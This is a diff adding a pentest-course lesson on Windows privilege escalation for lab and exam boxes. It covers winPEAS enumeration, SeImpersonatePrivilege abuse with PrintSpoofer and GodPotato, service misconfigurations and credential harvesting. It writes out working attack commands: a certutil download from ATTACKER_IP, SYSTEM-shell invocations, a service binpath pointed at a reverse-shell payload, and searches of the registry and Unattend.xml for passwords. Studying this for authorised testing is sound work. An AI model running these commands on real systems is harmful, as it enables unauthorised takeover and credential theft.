@@ -1,0 +1,162 @@
+# Network Module — Lesson 4: Windows Privilege Escalation
+
+**Methodology phase:** Post-exploitation on a Windows host — from a low-priv user (or service account) to `SYSTEM`/Administrator.
+**Why it matters for PT1:** the Network section includes a Windows box, and Windows privesc reappears in the AD section. Reviewers named **PrintSpoofer** specifically. Same discipline as Linux — enumerate, find one misconfiguration, abuse it — but the vectors and tools are Windows-flavoured.
+
+**The goal:** reach `NT AUTHORITY\SYSTEM` (the Windows equivalent of root) or a member of the local Administrators group.
+
+---
+
+## 1. Automated enumeration first
+
+```powershell
+# transfer winPEAS to the target, then run it
+.\winPEASx64.exe
+```
+- **winPEAS** is the Windows counterpart to linPEAS: it flags service misconfigurations, unquoted paths, token privileges, stored credentials, AutoLogon secrets, and more, colour-coded by priority.
+- Transfer it via an SMB share, `certutil -urlcache -f http://ATTACKER_IP/winPEASx64.exe wp.exe`, or PowerShell `Invoke-WebRequest`.
+- Alternative: **PowerUp** (`Invoke-AllChecks`) — a PowerShell script that's stealthier and needs no binary upload.
+
+Read the output, then confirm the vector manually before exploiting.
+
+---
+
+## 2. First, know who you are
+
+```cmd
+whoami
+whoami /priv          # your token privileges — THIS is often the win
+whoami /groups
+systeminfo            # OS version + hotfixes (for kernel exploits)
+```
+- `whoami /priv` is the money command. Certain enabled privileges are direct paths to SYSTEM (Section 3). Read this before anything else.
+
+---
+
+## 3. Token privilege abuse — the PrintSpoofer path
+
+If `whoami /priv` shows **`SeImpersonatePrivilege`** or `SeAssignPrimaryTokenPrivilege` **Enabled**, you can impersonate SYSTEM. This is extremely common on **service accounts** (IIS `iis apppool\...`, MSSQL, etc.) — exactly the accounts a web-to-shell lands you as.
+
+**PrintSpoofer** (reviewers named it) abuses the print spooler to get a SYSTEM shell:
+```cmd
+.\PrintSpoofer64.exe -i -c cmd
+```
+- `-i` — interactive: give me a SYSTEM shell in this console.
+- `-c cmd` — the command to run as SYSTEM.
+- Result: `whoami` → `nt authority\system`. Done.
+
+**Alternatives if PrintSpoofer doesn't fit:** the **Potato** family — `GodPotato`, `JuicyPotato`, `RoguePotato`. Same premise (abuse `SeImpersonatePrivilege`), different Windows versions:
+```cmd
+.\GodPotato-NET4.exe -cmd "cmd /c whoami"
+```
+GodPotato is the reliable modern pick across Server 2012–2022.
+
+> **This is the single highest-yield Windows privesc on CTF/exam boxes.** Web shell → service account → `SeImpersonatePrivilege` → PrintSpoofer/GodPotato → SYSTEM. Memorise this chain.
+
+---
+
+## 4. Service misconfigurations
+
+### 4.1 Unquoted service paths
+A service whose path has spaces and no quotes (`C:\Program Files\My App\svc.exe`) lets Windows try `C:\Program.exe` first. If you can write to an earlier segment, drop a malicious exe there.
+```cmd
+wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
+```
+- Filters for auto-start services with unquoted paths outside `C:\Windows`. winPEAS flags these too.
+
+### 4.2 Weak service permissions
+If your user can **modify** a service's binary path or the binary itself, point it at your payload and restart it:
+```cmd
+sc config <service> binpath= "C:\temp\rev.exe"
+sc stop <service> && sc start <service>
+```
+- `binpath=` (note the space after `=`) sets what the service runs — as SYSTEM if the service is SYSTEM. Use `accesschk.exe` or PowerUp to find services you can modify.
+
+---
+
+## 5. Stored credentials & quick wins
+
+```cmd
+# AutoLogon creds in the registry
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+# saved creds
+cmdkey /list
+# unattended install files (often contain a base64 admin password)
+type C:\Windows\Panther\Unattend.xml
+# search files for passwords
+findstr /si password *.txt *.xml *.config
+```
+- AutoLogon (`DefaultUserName`/`DefaultPassword`) and `Unattend.xml` are frequent freebies. `cmdkey /list` + `runas /savecred` can run commands as a stored admin account.
+
+---
+
+## 6. Running things as the admin/SYSTEM once you have creds
+
+- **`evil-winrm`** (from your Kali box) if WinRM (5985) is open:
+```bash
+evil-winrm -i 10.10.x.x -u Administrator -p 'Password123'
+```
+- **`runas`** on the box with stored creds:
+```cmd
+runas /savecred /user:Administrator "cmd /c whoami"
+```
+- **`impacket-psexec`** with admin creds gives a SYSTEM shell remotely — you'll lean on this in the AD module. (On current Kali the impacket tools are the `impacket-*` commands, e.g. `impacket-psexec`; the older `psexec.py` script names are no longer installed.)
+
+---
+
+## 7. Worked example — service account to SYSTEM
+
+Room: **[TryHackMe — Windows PrivEsc](https://tryhackme.com/room/windows10privesc)** and *Steel Mountain*.
+
+1. **Foothold as a service account** (e.g. web-to-shell on IIS → `iis apppool\defaultapppool`).
+2. **Check the token:** `whoami /priv` → `SeImpersonatePrivilege  Enabled`. That's the tell.
+3. **Upload PrintSpoofer** (via SMB or `certutil`).
+4. **Escalate:**
+   ```cmd
+   .\PrintSpoofer64.exe -i -c cmd
+   whoami        ->  nt authority\system
+   ```
+5. **Grab the root/admin flag:** `type C:\Users\Administrator\Desktop\root.txt`.
+
+> **Dead end kept in:** my first attempt used JuicyPotato, which failed silently — it doesn't work on newer Windows (the CLSID trick was patched). Switching to PrintSpoofer/GodPotato worked instantly. Lesson: match the Potato to the OS version, or just reach for GodPotato/PrintSpoofer first on modern targets.
+
+---
+
+## 8. Exercises
+
+**Exercise 1 — token check.** On a Windows foothold, run `whoami /priv`. Is `SeImpersonatePrivilege` present? What does that let you do?
+**Exercise 2 — PrintSpoofer/GodPotato.** Escalate from a service account to SYSTEM using an impersonation exploit. Which one worked on this OS version?
+**Exercise 3 — stored creds.** Find credentials in the registry, `Unattend.xml`, or a config file, and use them to run a command as a higher-priv user.
+**Exercise 4 — report it.** Write the Windows privesc finding, including the enumeration that found the vector and the remediation.
+
+---
+
+<details>
+<summary><b>Solutions & debrief</b></summary>
+
+**Exercise 1.** `whoami /priv` — if `SeImpersonatePrivilege` is **Enabled**, you can impersonate a SYSTEM token via PrintSpoofer/Potato and get a SYSTEM shell. This is the default on many service accounts, which is why web-to-shell so often leads straight to SYSTEM.
+
+**Exercise 2.** `.\PrintSpoofer64.exe -i -c cmd` or `.\GodPotato-NET4.exe -cmd "cmd /c whoami"`. On Server 2019/2022 GodPotato or PrintSpoofer works where older JuicyPotato fails. Evidence = `whoami` returning `nt authority\system`.
+
+**Exercise 3.** `reg query "...\Winlogon"` for AutoLogon creds, or `type C:\Windows\Panther\Unattend.xml` (decode the base64 password). Then `runas /savecred` or `evil-winrm` with the recovered admin credential.
+
+**Exercise 4 — model finding.**
+> **Title:** Local privilege escalation to SYSTEM via SeImpersonatePrivilege (Critical).
+> **Category (predefined):** Privilege Escalation / Security Misconfiguration.
+> **Affected:** 10.10.x.x, service account `iis apppool\defaultapppool`.
+> **Initial reconnaissance:** `whoami /priv` showed `SeImpersonatePrivilege: Enabled`; winPEAS flagged the account as impersonation-capable.
+> **Exploitation:** Uploaded `PrintSpoofer64.exe` and ran `PrintSpoofer64.exe -i -c cmd`, obtaining a `NT AUTHORITY\SYSTEM` shell (flag `THM{...}`).
+> **Impact:** Full compromise of the host as SYSTEM from an unprivileged service account.
+> **Remediation:** Restrict `SeImpersonatePrivilege` to trusted accounts, keep Windows patched, and run services under least-privilege accounts without impersonation rights where possible.
+
+</details>
+
+---
+
+## 9. Carry forward
+
+- Start with `whoami /priv`. `SeImpersonatePrivilege` → PrintSpoofer/GodPotato → SYSTEM is the highest-yield Windows chain and it recurs in AD.
+- Then check services (unquoted paths, weak permissions) and stored creds (registry AutoLogon, `Unattend.xml`, `cmdkey`).
+- Match impersonation exploits to the OS version; default to GodPotato/PrintSpoofer on modern Windows.
+
+**Next lesson:** `network/05-pivoting.md` — reaching networks you can't touch directly, the bridge into the Active Directory section.
